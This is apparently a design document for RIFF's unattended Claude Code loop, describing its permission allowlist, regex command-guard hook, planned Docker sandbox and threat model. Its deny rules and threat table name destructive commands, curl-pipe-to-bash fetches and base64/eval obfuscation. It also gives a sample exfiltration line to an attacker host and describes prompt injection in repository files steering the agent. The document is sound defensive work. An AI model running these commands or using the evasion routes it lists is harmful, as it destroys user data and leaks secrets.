# AFK Safety

The RIFF AFK loop (`riff-loop.sh`) runs Claude Code without a human in the loop. This document describes what RIFF does to keep that safe, what threats remain, and when to reach for the optional Docker sandbox.

## Defense layers

Three layers, each addressing different threats. Outer layers are cheap and always on; the inner layer is opt-in for higher-risk runs.

### Layer 1 — Permission allowlist (`templates/settings.afk.json`)

The loop launches Claude Code with `--settings <path>/settings.afk.json` (replacing the old `--dangerously-skip-permissions`). The settings file enforces:

- `defaultMode: dontAsk` — anything not on the allow list is auto-denied (no interactive prompt to skip past).
- `disableBypassPermissionsMode: disable` — the `--dangerously-skip-permissions` flag is rejected at runtime even if accidentally re-introduced.
- A curated **Bash allowlist** covering the standard RIFF flow: git, gh (read-only + `pr create`), npm/pnpm/yarn/bun, node/python/cargo/go, common file utilities, and the project's hook scripts.
- A **Bash denylist** covering destruction (`rm -rf /`, `rm -rf ~`), privilege escalation (`sudo`, `chmod 777`), remote-fetch-and-execute (`curl ... | bash`), bash-syntax evasion (`eval`, `bash -c`, `base64 -d`), git history rewrite (`git push --force`, `git reset --hard`), supply-chain push (`npm publish`, `npm install -g`), privileged side-channels (`docker`, `kubectl`, `systemctl`, `ssh`), and auth tampering (`gh auth`, `gh secret`, `gh pr merge`). The `auto_merge` strategy uses a mirror settings file (`templates/settings.afk.auto-merge.json`) plus a mirror hook (`hooks/dangerous-command-guard.auto-merge.sh`) that surgically permits the single form `gh pr merge --auto --squash --delete-branch` and nothing else; all other `gh pr merge` shapes stay denied.
- **Read/Edit/Write deny rules** scoped to user secrets and system files: `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `.env`, shell rc files, `/etc`, `/usr`, `/var`, `/bin`, `/sbin`.
- `WebFetch` is denied wholesale. AFK phases that need web access should be marked `mode: HITL`.

### Layer 2 — Defense-in-depth hook (`hooks/dangerous-command-guard.sh`)

Even with a strict allowlist, wildcard rules can miss obfuscation: `eval "$(echo ... | base64 -d)"`, multi-step `bash -c "$(curl ...)"`, or substitutions that change the shape of the command at runtime. The PreToolUse hook scans the literal command string against a regex denylist before execution.

Behavior:

- Reads PreToolUse JSON on stdin (per Claude Code's hook input convention) and parses `.tool_input.command`.
- Matches against ~40 regex patterns covering the same threat families as the deny list, plus obfuscation forms.
- On match: appends a JSON line to `<project>/.planning/security-events.log` (chmod 600), prints a structured stderr message, and exits 2 (blocks the tool call).
- **Fail-closed**: empty input or parsing failure also exits 2. AFK has no human to recover from a guard malfunction.

This hook complements `hooks/destructive-guard.sh` (the existing PreToolUse Bash guard for non-AFK projects). `dangerous-command-guard.sh` is a stricter superset and is the only Bash guard wired into AFK runs.

### Layer 3 — Optional Docker sandbox (planned, follow-up phase)

For the threat case that Layers 1 and 2 cannot fully address, **supply-chain compromise via dependency install**, RIFF will ship a Docker sandbox (`docker/Dockerfile`, `docker/run.sh`) in a follow-up. The sandbox provides:

- Network isolation (bridge network instead of host network).
- Filesystem isolation (project mount + ephemeral `~/.claude` copy).
- Reduced capabilities (`--cap-drop=ALL --security-opt=no-new-privileges --read-only`).
- Resource caps (`--memory`, `--cpus`, `--pids-limit`).

Use the Docker sandbox when running RIFF on cloned external code, evaluating an open-source repo, or any other run where the codebase itself is not yet trusted.

## Threat model

| # | Threat | Caught by | Residual |
|---|--------|-----------|----------|
| T1 | Prompt-injection in repo content emits literal destructive command (`rm -rf $HOME` from a fixture file) | Layer 1 + Layer 2 | None for literal forms; partial for obfuscated forms (Layer 3 closes) |
| T2 | Supply-chain: `npm install` runs a malicious post-install script that does `curl evil.sh \| bash` | Layer 3 only (network egress) | If Layer 3 absent, the attack runs as the host user with full network and filesystem access |
| T3 | Accidental destructive command from model hallucination (`rm -rf node_modules/../../`) | Layer 1 + Layer 2 | None |
| T4 | Path-escape via Edit/Write to `~/.ssh/authorized_keys` or `~/.zshrc` | Layer 1 (Read/Edit/Write deny rules) | None |
| T5 | Bash-syntax evasion (`eval` of base64-decoded payload) | Layer 1 + Layer 2 partial | Arbitrary obfuscation can in principle slip; Layer 3 closes |

## What this does NOT protect against

- **Reading sensitive data inside the project tree.** The project itself is mounted read-write; if a `.env` lives inside the repo, the model can read it via Bash (`cat .env` is denied by Read rules but `cat path/to/.env` from a different name is not). Don't put production secrets in your project tree.
- **Outbound network exfiltration via allowed tools.** `curl` is in the allow list (needed for normal flow). A determined model could exfiltrate data via `curl https://attacker/?leak=$(cat secret)`. Layer 3 (Docker network policy) is the answer when this matters.
- **Regression-introducing edits.** The guard checks safety, not correctness. The standard RIFF gates (security-reviewer, scope-checker, tests) catch correctness issues. AFK does not skip them.
- **PR merging on the default strategy.** Under `git.merge_strategy: github_button` (default) and `local_no_ff`, `gh pr merge` is denied wholesale. The loop opens PRs and stops; a human merges. Under `git.merge_strategy: auto_merge`, the loop swaps to mirror settings + a mirror hook that permits exactly `gh pr merge --auto --squash --delete-branch`. Any other `gh pr merge` variant (including compound forms like `gh pr merge ... && rm -rf .`) is still blocked. Contract: `specs/designs/phase9-afk-chaining.md`.

## Operational notes

- Logs land at `<project>/.planning/security-events.log` with mode 600. One JSON object per blocked command. Review after a long AFK run to surface attempted attacks or model misfires.
- If the guard blocks a command you genuinely need: don't relax the deny list. Instead either (a) split the command into allowed pieces, or (b) mark that phase `mode: HITL` so a human runs it.
- The settings file path is resolved relative to the framework root (`<framework>/templates/settings.afk.json`). The loop refuses to start if it's missing.
- The hook reads `.tool_input.command` from stdin via `jq`, with a `sed` fallback if `jq` is absent. On fallback the matching is degraded but still functional.

## See also

- `templates/settings.afk.json` — the allowlist itself (default strategy).
- `templates/settings.afk.auto-merge.json` — mirror allowlist used when `git.merge_strategy: auto_merge`.
- `hooks/dangerous-command-guard.sh` — the regex hook (default strategy).
- `hooks/dangerous-command-guard.auto-merge.sh` — mirror hook with the surgical carve-out for auto-merge.
- `riff-loop.sh` — the AFK loop integration point; selects the right settings file per strategy.
- `specs/designs/phase9-afk-chaining.md` — full chaining contract and threat reasoning.
